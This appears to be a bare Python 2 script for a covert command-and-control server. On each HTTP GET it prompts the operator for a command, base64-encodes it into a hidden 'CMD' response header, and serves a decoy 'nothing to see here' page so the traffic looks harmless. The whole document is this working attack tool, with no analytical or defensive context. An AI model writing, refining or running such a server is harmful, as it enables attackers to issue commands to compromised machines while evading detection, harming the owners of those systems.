from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import base64
 
PORT_NUMBER = 8080
 
class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        CMD = base64.b64encode(raw_input("CMD: >> "))
        self.send_header('CMD',CMD)
        self.end_headers()
        self.wfile.write("<html><body>nothing to see here</body></html>")
        return
try:
    server = HTTPServer(('', PORT_NUMBER), myHandler)
    server.serve_forever()
 
except KeyboardInterrupt:
    print '^C received, shutting down the web server'
    server.socket.close()
